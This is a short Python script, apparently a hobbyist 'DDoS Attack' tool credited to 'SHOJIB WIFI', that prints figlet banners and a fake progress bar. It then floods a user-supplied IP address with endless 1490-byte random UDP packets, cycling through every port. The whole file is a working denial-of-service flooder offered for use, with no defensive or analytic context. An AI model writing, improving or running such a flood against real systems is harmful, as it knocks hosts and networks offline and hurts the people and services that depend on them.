import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
os.system("figlet SHOJIB WIFI")
print()
print("Author   : SHOJIB WIFI")
print()

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    sock.sendto(bytes_data, (ip, port))
    sent = sent + 1
    port = port + 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port == 65534:
        port = 1